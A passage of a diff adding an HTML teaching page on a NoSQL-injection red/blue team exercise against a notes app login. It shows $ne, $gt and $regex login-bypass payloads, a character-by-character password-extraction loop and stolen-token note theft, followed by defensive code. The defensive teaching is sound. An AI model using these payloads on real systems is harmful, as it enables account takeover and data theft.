+<span class="c-comment">// {"$ne":""} → 400 rejected</span>
+<span class="c-ok">// → All injection blocked ✓</span></code>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════ DISCOVERY ══════════════════════════════ -->
+<section id="discovery">
+<div class="container">
+  <div class="section-tag red fade-up">02 — RED TEAM · RECONNAISSANCE</div>
+  <h2 class="fade-up stagger-1">Step 0 — Discovering<br>the Attack Surface</h2>
+  <p class="lead fade-up stagger-2">No source code access required. Every API endpoint is already visible in the browser — before a single attack is attempted.</p>
+
+  <div class="discovery-grid">
+    <div class="disco-card fade-up stagger-1">
+      <div class="disco-num">01</div>
+      <!-- DevTools icon -->
+      <svg width="36" height="36" viewBox="0 0 36 36" fill="none" style="margin-bottom:0.8rem">
+        <rect x="2" y="6" width="32" height="24" rx="3" stroke="#e53535" stroke-width="1.5" fill="none"/>
+        <rect x="2" y="6" width="32" height="8" rx="3" fill="#1a0808" stroke="#e53535" stroke-width="1.5"/>
+        <path d="M10 20 L16 24 L10 28" stroke="#e53535" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+        <line x1="18" y1="28" x2="26" y2="28" stroke="#6b7fa0" stroke-width="1.5" stroke-linecap="round"/>
+        <circle cx="8" cy="10" r="1.5" fill="#ff5f57"/>
+        <circle cx="13" cy="10" r="1.5" fill="#febc2e"/>
+        <circle cx="18" cy="10" r="1.5" fill="#28c840"/>
+      </svg>
+      <h3>Browser DevTools</h3>
+      <p>Press F12 → Network tab → submit any login attempt → watch the request go to <code style="font-family:var(--mono);font-size:0.78rem;color:#88aaff">POST /api/auth/login</code> in real-time.</p>
+    </div>
+
+    <div class="disco-card fade-up stagger-2">
+      <div class="disco-num">02</div>
+      <!-- Source code icon -->
+      <svg width="36" height="36" viewBox="0 0 36 36" fill="none" style="margin-bottom:0.8rem">
+        <rect x="4" y="2" width="22" height="32" rx="3" stroke="#e53535" stroke-width="1.5" fill="none"/>
+        <path d="M22 2 L32 12 L32 34 H26 V14 H22 V2Z" stroke="#e53535" stroke-width="1.5" fill="#1a0808"/>
+        <line x1="9" y1="12" x2="18" y2="12" stroke="#6b7fa0" stroke-width="1.5" stroke-linecap="round"/>
+        <line x1="9" y1="17" x2="20" y2="17" stroke="#6b7fa0" stroke-width="1.5" stroke-linecap="round"/>
+        <line x1="9" y1="22" x2="16" y2="22" stroke="#e53535" stroke-width="1.5" stroke-linecap="round"/>
+        <line x1="9" y1="27" x2="19" y2="27" stroke="#6b7fa0" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <h3>View Page Source</h3>
+      <p>Right-click → View Page Source → search <code style="font-family:var(--mono);font-size:0.78rem;color:#88aaff">fetch(</code> or <code style="font-family:var(--mono);font-size:0.78rem;color:#88aaff">/api/</code> — all endpoint URLs are printed in plain text inside the HTML.</p>
+    </div>
+
+    <div class="disco-card fade-up stagger-3">
+      <div class="disco-num">03</div>
+      <!-- Form icon -->
+      <svg width="36" height="36" viewBox="0 0 36 36" fill="none" style="margin-bottom:0.8rem">
+        <rect x="3" y="8" width="30" height="20" rx="3" stroke="#e53535" stroke-width="1.5" fill="none"/>
+        <rect x="7" y="13" width="22" height="5" rx="2" stroke="#6b7fa0" stroke-width="1.2" fill="none"/>
+        <rect x="7" y="21" width="14" height="5" rx="2" fill="#e53535" opacity="0.8"/>
+        <text x="14" y="25.5" fill="white" font-size="5" text-anchor="middle">Submit</text>
+        <path d="M2 4 Q18 1 34 4" stroke="#e53535" stroke-width="1" stroke-dasharray="2 2" fill="none" opacity="0.5"/>
+      </svg>
+      <h3>HTML Form Action</h3>
+      <p>The login form itself has <code style="font-family:var(--mono);font-size:0.78rem;color:#88aaff">action="/api/auth/login"</code> in the markup. No guessing required.</p>
+    </div>
+  </div>
+
+  <div class="endpoint-row fade-up stagger-4">
+    <span style="font-family:var(--mono);font-size:0.7rem;color:var(--muted);margin-right:0.5rem">DISCOVERED ENDPOINTS →</span>
+    <span class="ep post">POST /api/auth/login</span>
+    <span class="ep post">POST /api/auth/signup</span>
+    <span class="ep get">GET /api/notes</span>
+    <span class="ep post">POST /api/notes</span>
+    <span class="ep put">PUT /api/notes/:id</span>
+    <span class="ep del">DELETE /api/notes/:id</span>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════ RED TEAM ATTACKS ══════════════════════ -->
+<section id="attacks">
+<div class="team-banner red">
+  <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
+    <circle cx="22" cy="22" r="20" stroke="#e53535" stroke-width="1.5" fill="#1a0000"/>
+    <path d="M22 10 L26 18 L35 18 L28 24 L31 33 L22 27 L13 33 L16 24 L9 18 L18 18 Z" fill="#e53535" opacity="0.8"/>
+  </svg>
+  <div>
+    <div class="team-banner-label">RED TEAM — PENETRATION TESTING</div>
+    <p>6 injection attack vectors demonstrated against POST /api/auth/login</p>
+  </div>
+</div>
+
+<div class="container" style="padding-top:3rem">
+  <div class="section-tag red fade-up">03 — ATTACKS</div>
+  <h2 class="fade-up stagger-1">The 6 Attack Vectors</h2>
+
+  <div class="attacks-grid">
+
+    <!-- Attack 1 -->
+    <div class="attack-card fade-up stagger-1">
+      <div class="attack-card-header">
+        <div class="attack-num-badge">1</div>
+        <h3>Password Bypass — $ne</h3>
+        <span class="severity">CRITICAL</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Login as <strong>admin</strong> with zero knowledge of their password. <code style="font-family:var(--mono);color:#ff8888;font-size:0.82rem">{"$ne":""}</code> means <em>"not equal to empty"</em> — which matches any real password stored in the database.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+            <span class="lang">Attack 1 payload</span>
+          </div>
+          <code>{
+  <span class="c-key">"username"</span>: <span class="c-str">"admin"</span>,
+  <span class="c-key">"password"</span>: { <span class="c-op">"$ne"</span>: <span class="c-str">""</span> }
+}
+<span class="c-comment">// MongoDB: password != ""</span>
+<span class="c-warn">// → matches ANY non-empty password</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack 2 -->
+    <div class="attack-card fade-up stagger-2">
+      <div class="attack-card-header">
+        <div class="attack-num-badge">2</div>
+        <h3>Blind Login — $gt</h3>
+        <span class="severity">CRITICAL</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Login <strong>without knowing any credentials at all</strong>. <code style="font-family:var(--mono);color:#ff8888;font-size:0.82rem">{"$gt":""}</code> matches any string that is greater than empty — which is every real username and password.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+            <span class="lang">Attack 2 payload</span>
+          </div>
+          <code>{
+  <span class="c-key">"username"</span>: { <span class="c-op">"$gt"</span>: <span class="c-str">""</span> },
+  <span class="c-key">"password"</span>: { <span class="c-op">"$gt"</span>: <span class="c-str">""</span> }
+}
+<span class="c-comment">// Returns first user in DB</span>
+<span class="c-warn">// → no credentials needed</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack 3 -->
+    <div class="attack-card fade-up stagger-1">
+      <div class="attack-card-header">
+        <div class="attack-num-badge">3</div>
+        <h3>User Enumeration — $regex</h3>
+        <span class="severity">HIGH</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Iterate through the alphabet with <code style="font-family:var(--mono);color:#ff8888;font-size:0.82rem">$regex</code> to discover all usernames. Each letter reveals which users exist in the database.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+            <span class="lang">Attack 3 payload</span>
+          </div>
+          <code>{
+  <span class="c-key">"username"</span>: { <span class="c-op">"$regex"</span>: <span class="c-str">"^s"</span> },
+  <span class="c-key">"password"</span>: { <span class="c-op">"$gt"</span>: <span class="c-str">""</span> }
+}
+<span class="c-comment">// Try ^a, ^b … ^z</span>
+<span class="c-warn">// → discovers: student1, student2</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack 5 -->
+    <div class="attack-card fade-up stagger-2">
+      <div class="attack-card-header">
+        <div class="attack-num-badge">5</div>
+        <h3>Targeted Takeover — $ne</h3>
+        <span class="severity">CRITICAL</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Lock onto a <strong>specific user</strong> by name and bypass their password. <code style="font-family:var(--mono);color:#ff8888;font-size:0.82rem">{"$ne":"wrongpassword"}</code> matches because the real password is never the specified wrong value.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+            <span class="lang">Attack 5 payload</span>
+          </div>
+          <code>{
+  <span class="c-key">"username"</span>: <span class="c-str">"student2"</span>,
+  <span class="c-key">"password"</span>: { <span class="c-op">"$ne"</span>: <span class="c-str">"wrongpassword"</span> }
+}
+<span class="c-comment">// Real pwd ≠ "wrongpassword"</span>
+<span class="c-warn">// → student2 login success</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack 4 — wide, with SVG diagram -->
+    <div class="attack-card wide fade-up stagger-3">
+      <div class="attack-card-header">
+        <div class="attack-num-badge">4</div>
+        <h3>Password Extraction — Character-by-Character $regex</h3>
+        <span class="severity">CRITICAL</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Extract the full plaintext password one character at a time. Each request tests whether the password starts with a given prefix. On success (HTTP 200), extend the prefix. Repeat until the complete password is revealed.</p>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-top:1rem">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+              <span class="lang">Extraction loop (pseudocode)</span>
+            </div>
+            <code><span class="c-fn">for</span> char <span class="c-fn">in</span> <span class="c-str">"abcdefghijklmnopqrstuvwxyz0-9"</span>:
+  payload = {
+    <span class="c-key">"username"</span>: <span class="c-str">"admin"</span>,
+    <span class="c-key">"password"</span>: {
+      <span class="c-op">"$regex"</span>: <span class="c-fn">f</span><span class="c-str">"^{attempt}{char}"</span>
+    }
+  }
+  <span class="c-fn">if</span> POST → <span class="c-ok">200 OK</span>:
+    attempt += char  <span class="c-comment">// extend</span>
+    <span class="c-fn">break</span>
+<span class="c-warn">// ~270 requests → full password</span></code>
+          </div>
+          <!-- Extraction progress diagram -->
+          <div>
+            <svg viewBox="0 0 420 260" xmlns="http://www.w3.org/2000/svg">
+              <text x="0" y="18" fill="#6b7fa0" font-size="9" letter-spacing="1">PASSWORD EXTRACTION PROGRESS</text>
+              <!-- Steps -->
+              <g id="steps">
+                <!-- step rows -->
+                <rect x="0" y="28" width="420" height="26" rx="3" fill="#0d1928"/>
+                <text x="10" y="46" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="46" fill="#c9a9ff" font-size="10" font-family="JetBrains Mono,monospace">^a</text>
+                <text x="200" y="46" fill="#1dba6a" font-size="10">→ 200 OK</text>
+                <text x="290" y="46" fill="#6b7fa0" font-size="10">found: a</text>
+
+                <rect x="0" y="58" width="420" height="26" rx="3" fill="#0d1928"/>
+                <text x="10" y="76" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="76" fill="#c9a9ff" font-size="10" font-family="JetBrains Mono,monospace">^ad</text>
+                <text x="200" y="76" fill="#1dba6a" font-size="10">→ 200 OK</text>
+                <text x="290" y="76" fill="#6b7fa0" font-size="10">found: ad</text>
+
+                <rect x="0" y="88" width="420" height="26" rx="3" fill="#0d1928"/>
+                <text x="10" y="106" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="106" fill="#c9a9ff" font-size="10" font-family="JetBrains Mono,monospace">^adm</text>
+                <text x="200" y="106" fill="#1dba6a" font-size="10">→ 200 OK</text>
+                <text x="290" y="106" fill="#6b7fa0" font-size="10">found: adm</text>
+
+                <rect x="0" y="118" width="420" height="26" rx="3" fill="#0d1928"/>
+                <text x="10" y="136" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="136" fill="#c9a9ff" font-size="10" font-family="JetBrains Mono,monospace">^admi</text>
+                <text x="200" y="136" fill="#1dba6a" font-size="10">→ 200 OK</text>
+                <text x="290" y="136" fill="#6b7fa0" font-size="10">found: admi</text>
+
+                <rect x="0" y="148" width="420" height="26" rx="3" fill="#0d1928"/>
+                <text x="10" y="166" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="166" fill="#c9a9ff" font-size="10" font-family="JetBrains Mono,monospace">^admin</text>
+                <text x="200" y="166" fill="#1dba6a" font-size="10">→ 200 OK</text>
+                <text x="290" y="166" fill="#6b7fa0" font-size="10">found: admin</text>
+
+                <rect x="0" y="178" width="420" height="26" rx="3" fill="#0d1928"/>
+                <text x="10" y="196" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="196" fill="#c9a9ff" font-size="10" font-family="JetBrains Mono,monospace">^admin1</text>
+                <text x="200" y="196" fill="#1dba6a" font-size="10">→ 200 OK</text>
+                <text x="290" y="196" fill="#6b7fa0" font-size="10">found: admin1</text>
+
+                <rect x="0" y="208" width="420" height="26" rx="3" fill="#1a0800" stroke="#ff9944" stroke-width="1"/>
+                <text x="10" y="226" fill="#6b7fa0" font-size="10">regex:</text>
+                <text x="60" y="226" fill="#ffd670" font-size="10" font-family="JetBrains Mono,monospace">^admin123</text>
+                <text x="200" y="226" fill="#ff9944" font-size="10" font-weight="bold">→ 200 OK  ★</text>
+                <text x="290" y="226" fill="#ff9944" font-size="10">PASSWORD FOUND</text>
+
+                <!-- Final reveal -->
+                <rect x="0" y="238" width="420" height="22" rx="3" fill="#0d1928"/>
+                <text x="10" y="253" fill="#ffd670" font-size="10" font-family="JetBrains Mono,monospace">admin : admin123  — extracted in ~270 requests</text>
+              </g>
+            </svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack 6 -->
+    <div class="attack-card wide fade-up stagger-4">
+      <div class="attack-card-header">
+        <div class="attack-num-badge">6</div>
+        <h3>Data Exfiltration — Stolen Token → Private Notes</h3>
+        <span class="severity">CRITICAL</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Every successful injection above returns a valid session token. That token grants full access to any authenticated API route. The attacker now reads, creates, edits, or deletes the victim's private notes.</p>
+        <div style="display:grid;grid-template-columns:1fr 1.6fr;gap:1.5rem;margin-top:1rem">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+              <span class="lang">Attack 6</span>
+            </div>
+            <code><span class="c-comment">// Use token from any attack 1–5</span>
+GET /api/notes
+Authorization: Bearer <span class="c-warn">&lt;STOLEN_TOKEN&gt;</span>
+
+<span class="c-comment">// Response: victim's notes</span>
+[
+  {
+    <span class="c-key">"title"</span>: <span class="c-str">"System Config"</span>,
+    <span class="c-key">"content"</span>: <span class="c-str">"MongoDB on port 27017…"</span>
+  },
+  …
+]</code>
+          </div>
+
+          <!-- Chain diagram SVG -->
+          <svg viewBox="0 0 500 160" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <marker id="arr2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L7,3 z" fill="#e53535"/>
+              </marker>
+            </defs>
+            <text x="0" y="15" fill="#6b7fa0" font-size="9" letter-spacing="1">ATTACK CHAIN</text>
+            <!-- Boxes -->
+            <rect x="0" y="28" width="90" height="50" rx="5" fill="#1a0808" stroke="#e53535" stroke-width="1.2"/>
+            <text x="45" y="50" text-anchor="middle" fill="#ff8888" font-size="8.5" font-weight="bold">Inject</text>
+            <text x="45" y="64" text-anchor="middle" fill="#6b7fa0" font-size="8">Attack 1–5</text>
+            <text x="45" y="76" text-anchor="middle" fill="#6b7fa0" font-size="7.5">login endpoint</text>
+
+            <line x1="92" y1="53" x2="130" y2="53" stroke="#e53535" stroke-width="1.2" marker-end="url(#arr2)"/>
+            <text x="111" y="48" text-anchor="middle" fill="#e53535" font-size="7.5">200 OK</text>
+
+            <rect x="132" y="28" width="90" height="50" rx="5" fill="#1a0808" stroke="#e53535" stroke-width="1.2"/>
+            <text x="177" y="50" text-anchor="middle" fill="#ff8888" font-size="8.5" font-weight="bold">Stolen</text>
+            <text x="177" y="62" text-anchor="middle" fill="#ff8888" font-size="8.5" font-weight="bold">Token</text>
+            <text x="177" y="76" text-anchor="middle" fill="#6b7fa0" font-size="7.5">JWT / session</text>
+
+            <line x1="224" y1="53" x2="262" y2="53" stroke="#e53535" stroke-width="1.2" marker-end="url(#arr2)"/>
+            <text x="243" y="48" text-anchor="middle" fill="#e53535" font-size="7.5">Bearer</text>
+
+            <rect x="264" y="28" width="90" height="50" rx="5" fill="#1a0808" stroke="#e53535" stroke-width="1.2"/>
+            <text x="309" y="50" text-anchor="middle" fill="#ff8888" font-size="8.5" font-weight="bold">GET /api</text>
+            <text x="309" y="62" text-anchor="middle" fill="#ff8888" font-size="8.5" font-weight="bold">/notes</text>
+            <text x="309" y="76" text-anchor="middle" fill="#6b7fa0" font-size="7.5">auth passes</text>
+
+            <line x1="356" y1="53" x2="394" y2="53" stroke="#e53535" stroke-width="1.2" marker-end="url(#arr2)"/>
+            <text x="375" y="48" text-anchor="middle" fill="#e53535" font-size="7.5">data</text>
+
+            <rect x="396" y="28" width="90" height="50" rx="5" fill="#1a0808" stroke="#ff9944" stroke-width="1.5"/>
+            <text x="441" y="50" text-anchor="middle" fill="#ff9944" font-size="8.5" font-weight="bold">Private</text>
+            <text x="441" y="62" text-anchor="middle" fill="#ff9944" font-size="8.5" font-weight="bold">Notes</text>
+            <text x="441" y="76" text-anchor="middle" fill="#ff9944" font-size="7.5">exfiltrated!</text>
+
+            <!-- Impact -->
+            <rect x="0" y="100" width="490" height="50" rx="5" fill="#0d1928" stroke="#3a1a1a" stroke-width="1"/>
+            <text x="245" y="120" text-anchor="middle" fill="#6b7fa0" font-size="9">Attack chain impact — any of the 6 attacks grants the same downstream data access.</text>
+            <text x="245" y="136" text-anchor="middle" fill="#ff8888" font-size="9">No brute force. No password cracking. Full account compromise in a single request.</text>
+          </svg>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /attacks-grid -->
+</div>
+</section>
+
+<!-- ═══════════════════════════════ BLUE TEAM ══════════════════════════════ -->
+<section id="blueteam">
+<div class="team-banner blue">
+  <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
+    <circle cx="22" cy="22" r="20" stroke="#1a7fe0" stroke-width="1.5" fill="#00001a"/>
+    <path d="M22 8 L22 36 M14 16 L22 8 L30 16" stroke="#4baeff" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+    <path d="M14 24 Q14 32 22 34 Q30 32 30 24 V16 H14 Z" fill="none" stroke="#4baeff" stroke-width="1.5"/>
+  </svg>
+  <div>
+    <div class="team-banner-label">BLUE TEAM — INCIDENT RESPONSE</div>
+    <p>6 layered defences — no single bypass possible when controls are combined</p>
+  </div>
+</div>
+
+<div class="container" style="padding-top:3rem">
+  <div class="section-tag blue fade-up">04 — DEFENCES</div>
+  <h2 class="fade-up stagger-1">Defence-in-Depth</h2>
+  <p class="lead fade-up stagger-2">Each defence layer independently blocks one or more attacks. Together, they ensure that bypassing any single control does not lead to compromise.</p>
+
+  <!-- Defence pipeline SVG -->
+  <div class="diagram-wrap fade-up stagger-3">
+    <svg viewBox="0 0 1000 180" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arr-blue" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="#1a7fe0"/>
+        </marker>
+      </defs>
+
+      <text x="10" y="20" fill="#6b7fa0" font-size="9" letter-spacing="2">REQUEST FLOW THROUGH DEFENCE LAYERS</text>
+
+      <!-- Incoming request -->
+      <rect x="10" y="38" width="110" height="50" rx="5" fill="#0d1928" stroke="#152035"/>
+      <text x="65" y="62" text-anchor="middle" fill="#6b7fa0" font-size="9">INCOMING</text>
+      <text x="65" y="76" text-anchor="middle" fill="#6b7fa0" font-size="9">REQUEST</text>
+
+      <line x1="122" y1="63" x2="148" y2="63" stroke="#1a7fe0" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+
+      <!-- D4 -->
+      <rect x="150" y="28" width="120" height="70" rx="5" fill="#001428" stroke="#1a7fe0" stroke-width="1.5"/>
+      <rect x="150" y="28" width="120" height="6" rx="3" fill="#1a7fe0"/>
+      <text x="210" y="58" text-anchor="middle" fill="#4baeff" font-size="10" font-weight="bold">D4</text>
+      <text x="210" y="73" text-anchor="middle" fill="#9ab0c8" font-size="9">Rate Limiter</text>
+      <text x="210" y="86" text-anchor="middle" fill="#4a6080" font-size="8">10 req / 15 min</text>
+
+      <line x1="272" y1="63" x2="298" y2="63" stroke="#1a7fe0" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+
+      <!-- D6 -->
+      <rect x="300" y="28" width="120" height="70" rx="5" fill="#001428" stroke="#1a7fe0" stroke-width="1.5"/>
+      <rect x="300" y="28" width="120" height="6" rx="3" fill="#1a7fe0"/>
+      <text x="360" y="58" text-anchor="middle" fill="#4baeff" font-size="10" font-weight="bold">D6</text>
+      <text x="360" y="73" text-anchor="middle" fill="#9ab0c8" font-size="9">Security Logger</text>
+      <text x="360" y="86" text-anchor="middle" fill="#4a6080" font-size="8">flags non-strings</text>
+
+      <line x1="422" y1="63" x2="448" y2="63" stroke="#1a7fe0" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+
+      <!-- D1 -->
+      <rect x="450" y="28" width="120" height="70" rx="5" fill="#001428" stroke="#1a7fe0" stroke-width="1.5"/>
+      <rect x="450" y="28" width="120" height="6" rx="3" fill="#1a7fe0"/>
+      <text x="510" y="58" text-anchor="middle" fill="#4baeff" font-size="10" font-weight="bold">D1</text>
+      <text x="510" y="73" text-anchor="middle" fill="#9ab0c8" font-size="9">Type Validation</text>
+      <text x="510" y="86" text-anchor="middle" fill="#4a6080" font-size="8">reject non-string</text>
+
+      <line x1="572" y1="63" x2="598" y2="63" stroke="#1a7fe0" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+
+      <!-- D2 -->
+      <rect x="600" y="28" width="120" height="70" rx="5" fill="#001428" stroke="#1a7fe0" stroke-width="1.5"/>
+      <rect x="600" y="28" width="120" height="6" rx="3" fill="#1a7fe0"/>
+      <text x="660" y="58" text-anchor="middle" fill="#4baeff" font-size="10" font-weight="bold">D2</text>
+      <text x="660" y="73" text-anchor="middle" fill="#9ab0c8" font-size="9">Sanitization</text>
+      <text x="660" y="86" text-anchor="middle" fill="#4a6080" font-size="8">strip $ keys</text>
+
+      <line x1="722" y1="63" x2="748" y2="63" stroke="#1a7fe0" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+
+      <!-- D3 -->
+      <rect x="750" y="28" width="120" height="70" rx="5" fill="#001428" stroke="#1dba6a" stroke-width="1.5"/>
+      <rect x="750" y="28" width="120" height="6" rx="3" fill="#1dba6a"/>
+      <text x="810" y="58" text-anchor="middle" fill="#44ee88" font-size="10" font-weight="bold">D3</text>
+      <text x="810" y="73" text-anchor="middle" fill="#9ab0c8" font-size="9">bcrypt</text>
+      <text x="810" y="86" text-anchor="middle" fill="#4a6080" font-size="8">$regex can't match hash</text>
+
+      <line x1="872" y1="63" x2="898" y2="63" stroke="#1dba6a" stroke-width="1.5" marker-end="url(#arr-green)"/>
+
+      <!-- DB safe -->
+      <rect x="900" y="28" width="90" height="70" rx="5" fill="#001a0a" stroke="#1dba6a" stroke-width="2"/>
+      <text x="945" y="58" text-anchor="middle" fill="#44ee88" font-size="9" font-weight="bold">DB QUERY</text>
+      <text x="945" y="72" text-anchor="middle" fill="#1dba6a" font-size="9">CLEAN</text>
+      <text x="945" y="86" text-anchor="middle" fill="#44ee88" font-size="8">& SAFE ✓</text>
+
+      <!-- Drop-off arrows for attacks 1,2,5 at D1 -->
+      <path d="M510 98 L510 150 L510 155" stroke="#e53535" stroke-width="1" stroke-dasharray="4 2" fill="none"/>
+      <text x="510" y="170" text-anchor="middle" fill="#e53535" font-size="8">A1·A2·A5 → 400</text>
+
+      <!-- Drop-off at D4 for A3/A4 -->
+      <path d="M210 98 L210 150" stroke="#f59e0b" stroke-width="1" stroke-dasharray="4 2" fill="none"/>
+      <text x="210" y="168" text-anchor="middle" fill="#f59e0b" font-size="8">A3·A4 → 429</text>
+
+      <!-- D3 blocks A4 -->
+      <path d="M810 98 L810 150" stroke="#1dba6a" stroke-width="1" stroke-dasharray="4 2" fill="none"/>
+      <text x="810" y="168" text-anchor="middle" fill="#1dba6a" font-size="8">regex ≠ hash</text>
+    </svg>
+  </div>
+
+  <div class="defense-grid" style="margin-top:2.5rem">
+
+    <div class="def-card fade-up stagger-1">
+      <div class="def-card-header">
+        <div class="def-id">D1</div>
+        <h3>Input Type Validation</h3>
+      </div>
+      <div class="def-card-body">
+        <div class="counters">
+          <span class="counter-tag">Counters Attack 1</span>
+          <span class="counter-tag">Counters Attack 2</span>
+          <span class="counter-tag">Counters Attack 5</span>
+        </div>
+        <p>Rejects any request where username or password is not a plain string. MongoDB operator objects are blocked before reaching the database.</p>
+        <div class="code-block">
+          <div class="code-header"><div class="dots"><span class="r"/><span class="y"/><span class="g"/></div><span class="lang">auth.js</span></div>
+          <code><span class="c-fn">if</span> (<span class="c-fn">typeof</span> username !== <span class="c-str">'string'</span>
+    || <span class="c-fn">typeof</span> password !== <span class="c-str">'string'</span>) {
+  <span class="c-fn">return</span> res.<span class="c-fn">status</span>(<span class="c-val">400</span>).<span class="c-fn">json</span>({
+    message: <span class="c-str">'Invalid input'</span>
+  });
+}</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="def-card fade-up stagger-2">
+      <div class="def-card-header">
+        <div class="def-id">D2</div>
+        <h3>MongoDB Sanitization</h3>
+      </div>
+      <div class="def-card-body">
+        <div class="counters">
+          <span class="counter-tag">Counters All Operator Attacks</span>
+        </div>
+        <p>Global middleware strips any key containing <code style="font-family:var(--mono);color:#88aaff;font-size:0.8rem">$</code> from req.body, req.query, and req.params before any route handler sees the input.</p>
+        <div class="code-block">
+          <div class="code-header"><div class="dots"><span class="r"/><span class="y"/><span class="g"/></div><span class="lang">server.js</span></div>
+          <code><span class="c-fn">const</span> sanitize =
+  <span class="c-fn">require</span>(<span class="c-str">'express-mongo-sanitize'</span>);
+<span class="c-comment">// Strips $ operators globally</span>
+app.<span class="c-fn">use</span>(<span class="c-fn">sanitize.sanitize</span>);
+<span class="c-comment">// {"$ne":""} → removed</span></code>
+        </div>
+      </div>
+    </div>
+
+    <div class="def-card fade-up stagger-3">
+      <div class="def-card-header">
+        <div class="def-id">D3</div>
+        <h3>bcrypt Password Hashing</h3>
+      </div>
+      <div class="def-card-body">
+        <div class="counters">
+          <span class="counter-tag">Counters Attack 4</span>
+        </div>
+        <p>Passwords are stored as bcrypt hashes. A regex like <code style="font-family:var(--mono);color:#88aaff;font-size:0.8rem">^a</code> can never match <code style="font-family:var(--mono);color:#88aaff;font-size:0.8rem">$2b$12$…</code> — character extraction returns no results.</p>
+        <div class="code-block">
+          <div class="code-header"><div class="dots"><span class="r"/><span class="y"/><span class="g"/></div><span class="lang">auth.js</span></div>
+          <code><span class="c-comment">// Signup</span>
+<span class="c-fn">const</span> hash = <span class="c-fn">await</span> bcrypt.<span class="c-fn">hash</span>(pwd,<span class="c-val">12</span>);
+<span class="c-comment">// Login comparison</span>
+<span class="c-fn">const</span> ok = <span class="c-fn">await</span> bcrypt.<span class="c-fn">compare</span>(
+  plainPwd, user.password
+);
+<span class="c-comment">// $regex "^a" ≠ "$2b$12$…"</span></code>
+        </div>
+      </div>
+    </div>
+
+    <div class="def-card fade-up stagger-1">
+      <div class="def-card-header">
+        <div class="def-id">D4</div>
+        <h3>Rate Limiting</h3>
+      </div>
+      <div class="def-card-body">
+        <div class="counters">
+          <span class="counter-tag">Counters Attack 3</span>
+          <span class="counter-tag">Counters Attack 4</span>
+        </div>
+        <p>10 login attempts per IP per 15 minutes. Attacks 3 and 4 require hundreds of requests — rate limiting transforms seconds of work into days.</p>
+        <div class="code-block">
+          <div class="code-header"><div class="dots"><span class="r"/><span class="y"/><span class="g"/></div><span class="lang">server.js</span></div>
+          <code><span class="c-fn">const</span> limiter = <span class="c-fn">rateLimit</span>({
+  windowMs: <span class="c-val">15</span> * <span class="c-val">60</span> * <span class="c-val">1000</span>,
+  max: <span class="c-val">10</span>,
+  message: <span class="c-str">'Too many attempts'</span>
+});
+app.<span class="c-fn">use</span>(<span class="c-str">'/api/auth/login'</span>, limiter);</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="def-card fade-up stagger-2">
+      <div class="def-card-header">
+        <div class="def-id">D5</div>
+        <h3>Generic Error Responses</h3>
+      </div>
+      <div class="def-card-body">
+        <div class="counters">
+          <span class="counter-tag">Breaks Enumeration Loop (A3)</span>
+        </div>
+        <p>Replaces distinct error messages ("User not found", "Wrong password") with a single unified response — removing the signal attackers use to enumerate users.</p>
+        <div class="code-block">
+          <div class="code-header"><div class="dots"><span class="r"/><span class="y"/><span class="g"/></div><span class="lang">auth.js</span></div>
+          <code><span class="c-comment">// Before (leaks info)</span>
+<span class="c-warn">if (!user) → "User not found"</span>
+<span class="c-warn">if (!match) → "Wrong password"</span>
+<span class="c-comment">// After (unified)</span>
+<span class="c-fn">return</span> res.<span class="c-fn">status</span>(<span class="c-val">401</span>).<span class="c-fn">json</span>({
+  message: <span class="c-str">'Invalid credentials'</span>
+});</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="def-card fade-up stagger-3">
+      <div class="def-card-header">
+        <div class="def-id">D6</div>
+        <h3>Security Event Logging</h3>
+      </div>
+      <div class="def-card-body">
+        <div class="counters">
+          <span class="counter-tag">Detection Layer — All Attacks</span>
+        </div>
